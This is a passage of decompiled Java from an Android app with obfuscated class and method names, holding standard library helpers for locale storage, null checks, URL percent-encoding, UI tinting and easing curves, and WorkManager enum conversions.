            r5.deleteFile(r6)     // Catch: java.lang.Throwable -> L12
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L12
            return
        L12:
            r5 = move-exception
            goto L60
        L14:
            java.lang.String r1 = "androidx.appcompat.app.AppCompatDelegate.application_locales_record_file"
            r2 = 0
            java.io.FileOutputStream r5 = r5.openFileOutput(r1, r2)     // Catch: java.lang.Throwable -> L12 java.io.FileNotFoundException -> L57
            org.xmlpull.v1.XmlSerializer r1 = android.util.Xml.newSerializer()     // Catch: java.lang.Throwable -> L12
            r2 = 0
            r1.setOutput(r5, r2)     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            java.lang.String r3 = "UTF-8"
            java.lang.Boolean r4 = java.lang.Boolean.TRUE     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            r1.startDocument(r3, r4)     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            java.lang.String r3 = "locales"
            r1.startTag(r2, r3)     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            java.lang.String r3 = "application_locales"
            r1.attribute(r2, r3, r6)     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            java.lang.String r6 = "locales"
            r1.endTag(r2, r6)     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            r1.endDocument()     // Catch: java.lang.Throwable -> L42 java.lang.Exception -> L44
            if (r5 == 0) goto L4f
        L3e:
            r5.close()     // Catch: java.lang.Throwable -> L12 java.io.IOException -> L4f
            goto L4f
        L42:
            r6 = move-exception
            goto L51
        L44:
            r6 = move-exception
            java.lang.String r1 = "AppLocalesStorageHelper"
            java.lang.String r2 = "Storing App Locales : Failed to persist app-locales in storage "
            android.util.Log.w(r1, r2, r6)     // Catch: java.lang.Throwable -> L42
            if (r5 == 0) goto L4f
            goto L3e
        L4f:
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L12
            goto L5f
        L51:
            if (r5 == 0) goto L56
            r5.close()     // Catch: java.lang.Throwable -> L12 java.io.IOException -> L56
        L56:
            throw r6     // Catch: java.lang.Throwable -> L12
        L57:
            java.lang.String r5 = "AppLocalesStorageHelper"
            java.lang.String r6 = "Storing App Locales : FileNotFoundException: Cannot open file androidx.appcompat.app.AppCompatDelegate.application_locales_record_file for writing "
            android.util.Log.w(r5, r6)     // Catch: java.lang.Throwable -> L12
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L12
        L5f:
            return
        L60:
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L12
            throw r5
        */
        throw new UnsupportedOperationException("Method not decompiled: com.vdodsodjsdt.ej6unYlOWMDF.gBaBUmihn5l4u(android.content.Context, java.lang.String):void");
    }

    public static void h3jnZRsdwYJfY9UhQCkbvWciwvFHv(Object obj, String str) {
        if (obj != null) {
            return;
        }
        NullPointerException nullPointerException = new NullPointerException(str.concat(" must not be null"));
        zOk739gUM7zIZC25HHUxoiyixWFjn(nullPointerException, ej6unYlOWMDF.class.getName());
        throw nullPointerException;
    }

    public static int hKs1wlZyvtUNaW1f5ABIGacfPcvX(Context context, int i, int i2) {
        TypedValue typedValueJUdwvN8LfOMa = JUdwvN8LfOMa(context, i);
        return (typedValueJUdwvN8LfOMa == null || typedValueJUdwvN8LfOMa.type != 16) ? i2 : typedValueJUdwvN8LfOMa.data;
    }

    public static final int iKANjmyTSxO6v6UuLPdu7DxOjlS(int i) {
        if (i == 0) {
            return 1;
        }
        if (i == 1) {
            return 2;
        }
        if (i == 2) {
            return 3;
        }
        if (i == 3) {
            return 4;
        }
        if (i == 4) {
            return 5;
        }
        if (i == 5) {
            return 6;
        }
        throw new IllegalArgumentException(u9SlVAuoWhQUfJ.ZLZeBXTMq0zDztBxtRTuCHrapQ(i, "Could not convert ", " to State"));
    }

    public static ImageView.ScaleType jW7EiD0YL6xkbB158jMUzhWNWb1y(int i) {
        return i != 0 ? i != 1 ? i != 2 ? i != 3 ? i != 5 ? i != 6 ? ImageView.ScaleType.CENTER : ImageView.ScaleType.CENTER_INSIDE : ImageView.ScaleType.CENTER_CROP : ImageView.ScaleType.FIT_END : ImageView.ScaleType.FIT_CENTER : ImageView.ScaleType.FIT_START : ImageView.ScaleType.FIT_XY;
    }

    public static int ko09zE6UAgwkV(int i, int i2) {
        if (i < i2) {
            return -1;
        }
        return i == i2 ? 0 : 1;
    }

    public static void lQ0rO9lhQIyVe7Rp6(TextInputLayout textInputLayout, CheckableImageButton checkableImageButton, ColorStateList colorStateList) {
        Drawable drawable = checkableImageButton.getDrawable();
        if (checkableImageButton.getDrawable() == null || colorStateList == null || !colorStateList.isStateful()) {
            return;
        }
        int[] drawableState = textInputLayout.getDrawableState();
        int[] drawableState2 = checkableImageButton.getDrawableState();
        int length = drawableState.length;
        int[] iArrCopyOf = Arrays.copyOf(drawableState, drawableState.length + drawableState2.length);
        System.arraycopy(drawableState2, 0, iArrCopyOf, length, drawableState2.length);
        int colorForState = colorStateList.getColorForState(iArrCopyOf, colorStateList.getDefaultColor());
        Drawable drawableMutate = drawable.mutate();
        drawableMutate.setTintList(ColorStateList.valueOf(colorForState));
        checkableImageButton.setImageDrawable(drawableMutate);
    }

    public static final Object mhUCRR8ceqc7mAozW(D73WsmU258PapcWZb45SFW d73WsmU258PapcWZb45SFW, Object obj, Object obj2, MGk7KfXeUv8YAfWiUw5LfOd mGk7KfXeUv8YAfWiUw5LfOd, IvfXhmjM3e3K ivfXhmjM3e3K) {
        Object objNSjgqmGjEzuugn2SsG1mZFP;
        Object objZ1FjjMJ0suz8AFI7gsA4GDLMXv = sGipz63rTUmSj3uFDvOtzihao.Z1FjjMJ0suz8AFI7gsA4GDLMXv(d73WsmU258PapcWZb45SFW, obj2);
        try {
            K3nwebrxqVyL6kywR k3nwebrxqVyL6kywR = new K3nwebrxqVyL6kywR(ivfXhmjM3e3K, d73WsmU258PapcWZb45SFW);
            if (mGk7KfXeUv8YAfWiUw5LfOd == null) {
                objNSjgqmGjEzuugn2SsG1mZFP = sGipz63rTUmSj3uFDvOtzihao.mhUCRR8ceqc7mAozW(mGk7KfXeUv8YAfWiUw5LfOd, obj, k3nwebrxqVyL6kywR);
            } else {
                F44whnLsbQ.V57tEvNfxZVVcOCAOih5PKr(2, mGk7KfXeUv8YAfWiUw5LfOd);
                objNSjgqmGjEzuugn2SsG1mZFP = mGk7KfXeUv8YAfWiUw5LfOd.NSjgqmGjEzuugn2SsG1mZFP(obj, k3nwebrxqVyL6kywR);
            }
            sGipz63rTUmSj3uFDvOtzihao.JUdwvN8LfOMa(d73WsmU258PapcWZb45SFW, objZ1FjjMJ0suz8AFI7gsA4GDLMXv);
            if (objNSjgqmGjEzuugn2SsG1mZFP == w0JnONr1KwCkZY9pA0QjUDuh9aMcU.V57tEvNfxZVVcOCAOih5PKr) {
                pYmKDYlAmhudp(ivfXhmjM3e3K, "frame");
            }
            return objNSjgqmGjEzuugn2SsG1mZFP;
        } catch (Throwable th) {
            sGipz63rTUmSj3uFDvOtzihao.JUdwvN8LfOMa(d73WsmU258PapcWZb45SFW, objZ1FjjMJ0suz8AFI7gsA4GDLMXv);
            throw th;
        }
    }

    public static void p59rPv72J9(Object obj) {
        if (obj != null) {
            return;
        }
        NullPointerException nullPointerException = new NullPointerException();
        zOk739gUM7zIZC25HHUxoiyixWFjn(nullPointerException, ej6unYlOWMDF.class.getName());
        throw nullPointerException;
    }

    public static void pYmKDYlAmhudp(Object obj, String str) {
        if (obj != null) {
            return;
        }
        NullPointerException nullPointerException = new NullPointerException(TaDO7ogis3aEiWEtq(str));
        zOk739gUM7zIZC25HHUxoiyixWFjn(nullPointerException, ej6unYlOWMDF.class.getName());
        throw nullPointerException;
    }

    public static final N9kD5AYBrQBMPxsV0 pzqP2AqKW6J5PO8zCKnW(XL61XSHqyMdc1 xL61XSHqyMdc1) {
        ArrayList arrayList = new ArrayList();
        Class clsVxUQ9tBhpHJ2AAEDNW8sghc4m = LbKUuf4Fs4.VxUQ9tBhpHJ2AAEDNW8sghc4m(N9kD5AYBrQBMPxsV0.class).VxUQ9tBhpHJ2AAEDNW8sghc4m();
        Ca81ebIan1u(clsVxUQ9tBhpHJ2AAEDNW8sghc4m, "null cannot be cast to non-null type java.lang.Class<T of kotlin.jvm.JvmClassMappingKt.<get-java>>");
        arrayList.add(new GYL2p896gVbkuPto(clsVxUQ9tBhpHJ2AAEDNW8sghc4m));
        GYL2p896gVbkuPto[] gYL2p896gVbkuPtoArr = (GYL2p896gVbkuPto[]) arrayList.toArray(new GYL2p896gVbkuPto[0]);
        return (N9kD5AYBrQBMPxsV0) new NrjuzzioPqfttNRptBDpZDzSYUrcM(xL61XSHqyMdc1.ZfQNn8hdWlEQ5cR94249PDsLR(), new Skgk8FYn8b4TvRiBOsElZw4XkNLhQ((GYL2p896gVbkuPto[]) Arrays.copyOf(gYL2p896gVbkuPtoArr, gYL2p896gVbkuPtoArr.length)), xL61XSHqyMdc1 instanceof zcuZ56coxbuAPrHfBRu ? ((zcuZ56coxbuAPrHfBRu) xL61XSHqyMdc1).V57tEvNfxZVVcOCAOih5PKr() : q0NrTGMX4C4J9WC1czCeMW9W7Dnrg.zzpBGItXfub0yWj).q1wNbhk2O6(N9kD5AYBrQBMPxsV0.class, "androidx.lifecycle.internal.SavedStateHandlesVM");
    }

    public static final String q11o1hieEkZDhF1MGOZI26oZiDT(long j) {
        String str;
        if (j <= -999500000) {
            str = ((j - ((long) 500000000)) / ((long) 1000000000)) + " s ";
        } else if (j <= -999500) {
            str = ((j - ((long) 500000)) / ((long) 1000000)) + " ms";
        } else if (j <= 0) {
            str = ((j - ((long) 500)) / ((long) 1000)) + " µs";
        } else if (j < 999500) {
            str = ((j + ((long) 500)) / ((long) 1000)) + " µs";
        } else if (j < 999500000) {
            str = ((j + ((long) 500000)) / ((long) 1000000)) + " ms";
        } else {
            str = ((j + ((long) 500000000)) / ((long) 1000000000)) + " s ";
        }
        return String.format("%6s", Arrays.copyOf(new Object[]{str}, 1));
    }

    public static String q1wNbhk2O6(String str, int i, int i2, String str2, int i3) {
        int i4 = (i3 & 1) != 0 ? 0 : i;
        int length = (i3 & 2) != 0 ? str.length() : i2;
        boolean z = (i3 & 8) == 0;
        boolean z2 = (i3 & 16) == 0;
        boolean z3 = (i3 & 32) == 0;
        boolean z4 = (i3 & 64) == 0;
        pYmKDYlAmhudp(str, "<this>");
        int iCharCount = i4;
        while (iCharCount < length) {
            int iCodePointAt = str.codePointAt(iCharCount);
            int i5 = 32;
            if (iCodePointAt < 32 || iCodePointAt == 127 || ((iCodePointAt >= 128 && !z4) || cwhrCnoVJBjJE2CBEAvBopmgF.VOvSEdhaZyc0oOGQ8(str2, (char) iCodePointAt) || ((iCodePointAt == 37 && (!z || (z2 && !CixTK5ZX8oWXHz34qHYV(str, iCharCount, length)))) || (iCodePointAt == 43 && z3)))) {
                EouCzLZsW9ynithduh eouCzLZsW9ynithduh = new EouCzLZsW9ynithduh();
                eouCzLZsW9ynithduh.d9zDyyznnp3oaDT1Ug(str, i4, iCharCount);
                EouCzLZsW9ynithduh eouCzLZsW9ynithduh2 = null;
                while (iCharCount < length) {
                    int iCodePointAt2 = str.codePointAt(iCharCount);
                    if (!z || (iCodePointAt2 != 9 && iCodePointAt2 != 10 && iCodePointAt2 != 12 && iCodePointAt2 != 13)) {
                        if (iCodePointAt2 == i5 && str2 == " !\"#$&'()+,/:;<=>?@[\\]^`{|}~") {
                            eouCzLZsW9ynithduh.TqcnImqkSWIKht("+");
                        } else if (iCodePointAt2 == 43 && z3) {
                            eouCzLZsW9ynithduh.TqcnImqkSWIKht(z ? "+" : "%2B");
                        } else {
                            if (iCodePointAt2 >= i5 && iCodePointAt2 != 127) {
                                if ((iCodePointAt2 < 128 || z4) && !cwhrCnoVJBjJE2CBEAvBopmgF.VOvSEdhaZyc0oOGQ8(str2, (char) iCodePointAt2) && (iCodePointAt2 != 37 || (z && (!z2 || CixTK5ZX8oWXHz34qHYV(str, iCharCount, length))))) {
                                    eouCzLZsW9ynithduh.CixTK5ZX8oWXHz34qHYV(iCodePointAt2);
                                }
                            }
                            if (eouCzLZsW9ynithduh2 == null) {
                                eouCzLZsW9ynithduh2 = new EouCzLZsW9ynithduh();
                            }
                            eouCzLZsW9ynithduh2.CixTK5ZX8oWXHz34qHYV(iCodePointAt2);
                            while (!eouCzLZsW9ynithduh2.HzCpKshMOoaw76hFcbOVRYMeRd()) {
                                byte b = eouCzLZsW9ynithduh2.readByte();
                                eouCzLZsW9ynithduh.O1xDAlBZZlZdoEf747lCFHld(37);
                                char[] cArr = HzCpKshMOoaw76hFcbOVRYMeRd;
                                eouCzLZsW9ynithduh.O1xDAlBZZlZdoEf747lCFHld(cArr[((b & 255) >> 4) & 15]);
                                eouCzLZsW9ynithduh.O1xDAlBZZlZdoEf747lCFHld(cArr[b & 15]);
                            }
                        }
                    }
                    iCharCount += Character.charCount(iCodePointAt2);
                    i5 = 32;
                }
                return eouCzLZsW9ynithduh.RhfGHxtXxy0M0grmp2jkRjQg();
            }
            iCharCount += Character.charCount(iCodePointAt);
        }
        String strSubstring = str.substring(i4, length);
        h3jnZRsdwYJfY9UhQCkbvWciwvFHv(strSubstring, "substring(...)");
        return strSubstring;
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    public static final Class qNPQb1obP7(XhOTOb5WElknWhz7qZHtdk xhOTOb5WElknWhz7qZHtdk) {
        pYmKDYlAmhudp(xhOTOb5WElknWhz7qZHtdk, "<this>");
        Class clsVxUQ9tBhpHJ2AAEDNW8sghc4m = ((PAV4EgyY4zt6) xhOTOb5WElknWhz7qZHtdk).VxUQ9tBhpHJ2AAEDNW8sghc4m();
        if (clsVxUQ9tBhpHJ2AAEDNW8sghc4m.isPrimitive()) {
            String name = clsVxUQ9tBhpHJ2AAEDNW8sghc4m.getName();
            switch (name.hashCode()) {
                case -1325958191:
                    if (name.equals("double")) {
                        return Double.class;
                    }
                    break;
                case 104431:
                    if (name.equals("int")) {
                        return Integer.class;
                    }
                    break;
                case 3039496:
                    if (name.equals("byte")) {
                        return Byte.class;
                    }
                    break;
                case 3052374:
                    if (name.equals("char")) {
                        return Character.class;
                    }
                    break;
                case 3327612:
                    if (name.equals("long")) {
                        return Long.class;
                    }
                    break;
                case 3625364:
                    if (name.equals("void")) {
                        return Void.class;
                    }
                    break;
                case 64711720:
                    if (name.equals("boolean")) {
                        return Boolean.class;
                    }
                    break;
                case 97526364:
                    if (name.equals("float")) {
                        return Float.class;
                    }
                    break;
                case 109413500:
                    if (name.equals("short")) {
                        return Short.class;
                    }
                    break;
            }
        }
        return clsVxUQ9tBhpHJ2AAEDNW8sghc4m;
    }

    public static final int qygqjTppWwx992(int i) {
        if (i == 0) {
            return 1;
        }
        if (i == 1) {
            return 2;
        }
        throw new IllegalArgumentException(u9SlVAuoWhQUfJ.ZLZeBXTMq0zDztBxtRTuCHrapQ(i, "Could not convert ", " to OutOfQuotaPolicy"));
    }

    public static void rERAmyEtGV6ANGszuKcQI(CheckableImageButton checkableImageButton, View.OnLongClickListener onLongClickListener) {
        boolean zHasOnClickListeners = checkableImageButton.hasOnClickListeners();
        boolean z = onLongClickListener != null;
        boolean z2 = zHasOnClickListeners || z;
        checkableImageButton.setFocusable(z2);
        checkableImageButton.setClickable(zHasOnClickListeners);
        checkableImageButton.setPressable(zHasOnClickListeners);
        checkableImageButton.setLongClickable(z);
        checkableImageButton.setImportantForAccessibility(z2 ? 1 : 2);
    }

    public static final VKeHn9sH669RutJ8aaqncC tFRdVJAePmTx77bP7FAN0uI(byte[] bArr) throws IOException {
        pYmKDYlAmhudp(bArr, "bytes");
        if (Build.VERSION.SDK_INT < 28 || bArr.length == 0) {
            return new VKeHn9sH669RutJ8aaqncC(null);
        }
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bArr);
        try {
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            try {
                int i = objectInputStream.readInt();
                int[] iArr = new int[i];
                for (int i2 = 0; i2 < i; i2++) {
                    iArr[i2] = objectInputStream.readInt();
                }
                int i3 = objectInputStream.readInt();
                int[] iArr2 = new int[i3];
                for (int i4 = 0; i4 < i3; i4++) {
                    iArr2[i4] = objectInputStream.readInt();
                }
                VKeHn9sH669RutJ8aaqncC vKeHn9sH669RutJ8aaqncCPYmKDYlAmhudp = FLWIoSaHb1q8TqFvEBgPyRGrzvi6.pYmKDYlAmhudp(iArr2, iArr);
                objectInputStream.close();
                byteArrayInputStream.close();
                return vKeHn9sH669RutJ8aaqncCPYmKDYlAmhudp;
            } finally {
            }
        } finally {
        }
    }

    public static final OR0CruaKl9s17fPszEbrsfoKYmn vBGA6pPLqSMuYGvprl270j7(Throwable th) {
        pYmKDYlAmhudp(th, "exception");
        return new OR0CruaKl9s17fPszEbrsfoKYmn(th);
    }

    public static TimeInterpolator vXWl0o6I4U59CgHs9(Context context, int i, TimeInterpolator timeInterpolator) {
        TypedValue typedValue = new TypedValue();
        if (!context.getTheme().resolveAttribute(i, typedValue, true)) {
            return timeInterpolator;
        }
        if (typedValue.type != 3) {
            throw new IllegalArgumentException("Motion easing theme attribute must be an @interpolator resource for ?attr/motionEasing*Interpolator attributes or a string for ?attr/motionEasing* attributes.");
        }
        String strValueOf = String.valueOf(typedValue.string);
        if (!TqcnImqkSWIKht(strValueOf, "cubic-bezier") && !TqcnImqkSWIKht(strValueOf, "path")) {
            return AnimationUtils.loadInterpolator(context, typedValue.resourceId);
        }
        if (TqcnImqkSWIKht(strValueOf, "cubic-bezier")) {
            String[] strArrSplit = strValueOf.substring(13, strValueOf.length() - 1).split(",");
            if (strArrSplit.length == 4) {
                return new PathInterpolator(SuB3hEmTmbbRGAhtvOOmfKEon(strArrSplit, 0), SuB3hEmTmbbRGAhtvOOmfKEon(strArrSplit, 1), SuB3hEmTmbbRGAhtvOOmfKEon(strArrSplit, 2), SuB3hEmTmbbRGAhtvOOmfKEon(strArrSplit, 3));
            }
            throw new IllegalArgumentException("Motion easing theme attribute must have 4 control points if using bezier curve format; instead got: " + strArrSplit.length);
        }
        if (!TqcnImqkSWIKht(strValueOf, "path")) {
            throw new IllegalArgumentException("Invalid motion easing type: ".concat(strValueOf));
        }
        String strSubstring = strValueOf.substring(5, strValueOf.length() - 1);
        Path path = new Path();
        try {
            z0zMVFrIHPlPXE40lO7hy9QDKt8FJ.zzpBGItXfub0yWj(FLWIoSaHb1q8TqFvEBgPyRGrzvi6.ko09zE6UAgwkV(strSubstring), path);
            return new PathInterpolator(path);
        } catch (RuntimeException e) {
            throw new RuntimeException("Error in parsing ".concat(strSubstring), e);
        }
    }

    public static Set w0Wu95l8dVNw5rZMRu() {
        try {
            Object objInvoke = Class.forName("android.text.EmojiConsistency").getMethod("getEmojiConsistencySet", null).invoke(null, null);
            if (objInvoke == null) {
                return Collections.EMPTY_SET;
            }
            Set set = (Set) objInvoke;
            Iterator it = set.iterator();
            while (it.hasNext()) {
                if (!(it.next() instanceof int[])) {
                    return Collections.EMPTY_SET;
                }
            }
            return set;
        } catch (Throwable unused) {
            return Collections.EMPTY_SET;
        }
    }

    public static String wRCD0SdqWCowdYU7bmzN(String str, int i, int i2, int i3) {
        int i4;
        if ((i3 & 1) != 0) {
            i = 0;
        }
        if ((i3 & 2) != 0) {
            i2 = str.length();
        }
        boolean z = (i3 & 4) == 0;
        pYmKDYlAmhudp(str, "<this>");
        int iCharCount = i;
        while (iCharCount < i2) {
            char cCharAt = str.charAt(iCharCount);
            if (cCharAt == '%' || (cCharAt == '+' && z)) {
                EouCzLZsW9ynithduh eouCzLZsW9ynithduh = new EouCzLZsW9ynithduh();
                eouCzLZsW9ynithduh.d9zDyyznnp3oaDT1Ug(str, i, iCharCount);
                while (iCharCount < i2) {
                    int iCodePointAt = str.codePointAt(iCharCount);
                    if (iCodePointAt == 37 && (i4 = iCharCount + 2) < i2) {
                        int iHzCpKshMOoaw76hFcbOVRYMeRd = jHlOQHj3hlCsydfI7r5ApVdQjYvKf.HzCpKshMOoaw76hFcbOVRYMeRd(str.charAt(iCharCount + 1));
                        int iHzCpKshMOoaw76hFcbOVRYMeRd2 = jHlOQHj3hlCsydfI7r5ApVdQjYvKf.HzCpKshMOoaw76hFcbOVRYMeRd(str.charAt(i4));
                        if (iHzCpKshMOoaw76hFcbOVRYMeRd == -1 || iHzCpKshMOoaw76hFcbOVRYMeRd2 == -1) {
                            eouCzLZsW9ynithduh.CixTK5ZX8oWXHz34qHYV(iCodePointAt);
                            iCharCount += Character.charCount(iCodePointAt);
                        } else {
                            eouCzLZsW9ynithduh.O1xDAlBZZlZdoEf747lCFHld((iHzCpKshMOoaw76hFcbOVRYMeRd << 4) + iHzCpKshMOoaw76hFcbOVRYMeRd2);
                            iCharCount = Character.charCount(iCodePointAt) + i4;
                        }
                    } else if (iCodePointAt == 43 && z) {
                        eouCzLZsW9ynithduh.O1xDAlBZZlZdoEf747lCFHld(32);
                        iCharCount++;
                    } else {
                        eouCzLZsW9ynithduh.CixTK5ZX8oWXHz34qHYV(iCodePointAt);
                        iCharCount += Character.charCount(iCodePointAt);
                    }
                }
                return eouCzLZsW9ynithduh.RhfGHxtXxy0M0grmp2jkRjQg();
            }
            iCharCount++;
        }
        String strSubstring = str.substring(i, i2);
        h3jnZRsdwYJfY9UhQCkbvWciwvFHv(strSubstring, "substring(...)");
        return strSubstring;
    }

    public static TypedValue wdI7vzA3Qmcwd(int i, Context context, String str) {
        TypedValue typedValueJUdwvN8LfOMa = JUdwvN8LfOMa(context, i);
        if (typedValueJUdwvN8LfOMa != null) {
            return typedValueJUdwvN8LfOMa;
        }
        throw new IllegalArgumentException(String.format("%1$s requires a value for the %2$s attribute to be set in your app theme. You can either set the attribute in your theme or update your theme to inherit from Theme.MaterialComponents (or a descendant).", str, context.getResources().getResourceName(i)));
    }

    public static final int y1NaPKTl7R18DOr6e8i5(int i) {
        if (i == 0) {
            return 1;
        }
        if (i == 1) {
            return 2;
        }
        if (i == 2) {
            return 3;
        }
        if (i == 3) {
            return 4;
        }
        if (i == 4) {
            return 5;
        }
        if (Build.VERSION.SDK_INT < 30 || i != 5) {
            throw new IllegalArgumentException(u9SlVAuoWhQUfJ.ZLZeBXTMq0zDztBxtRTuCHrapQ(i, "Could not convert ", " to NetworkType"));
        }
        return 6;
    }

    public static final void zIvmSL0wzmmKGc3X39b2Gw2mUGE(Logger logger, eb3lIx1g1S4TGeJI46hOG7Bd eb3lix1g1s4tgeji46hog7bd, MpsgFCfSVNxgvcBlEbc8Iuyh3Obq mpsgFCfSVNxgvcBlEbc8Iuyh3Obq, String str) {
        logger.fine(mpsgFCfSVNxgvcBlEbc8Iuyh3Obq.zzpBGItXfub0yWj + ' ' + String.format("%-22s", Arrays.copyOf(new Object[]{str}, 1)) + ": " + eb3lix1g1s4tgeji46hog7bd.VxUQ9tBhpHJ2AAEDNW8sghc4m);
    }

    public static void zOk739gUM7zIZC25HHUxoiyixWFjn(RuntimeException runtimeException, String str) {
        StackTraceElement[] stackTrace = runtimeException.getStackTrace();
        int length = stackTrace.length;
        int i = -1;
        for (int i2 = 0; i2 < length; i2++) {
            if (str.equals(stackTrace[i2].getClassName())) {
                i = i2;
            }
        }
        runtimeException.setStackTrace((StackTraceElement[]) Arrays.copyOfRange(stackTrace, i + 1, length));
    }

    public abstract void H2VFYNJEVGAX(dqrRplqyPGe dqrrplqypge, float f);

    public abstract boolean YdNRGRc4rly();

    public abstract float vE4yDIjexsP2lGjLaTcB(dqrRplqyPGe dqrrplqypge);

    public abstract View ymT6yQrus3w(int i);
}
